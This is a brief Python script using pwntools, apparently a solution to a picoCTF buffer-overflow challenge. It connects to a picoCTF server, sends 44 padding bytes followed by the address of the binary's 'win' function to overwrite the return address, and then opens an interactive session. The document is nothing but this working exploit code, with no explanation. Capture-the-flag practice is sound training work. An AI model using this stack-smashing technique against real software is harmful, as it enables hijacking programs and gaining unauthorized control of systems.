from pwn import *

elf = context.binary = ELF("./vuln")

p = remote("saturn.picoctf.net", 59449)

OFFSET = 44

if __name__ == "__main__":
	payload = b"A" * 44 + p32(elf.symbols["win"])

	p.sendlineafter(b"Please enter your string: ", payload)

	p.interactive()

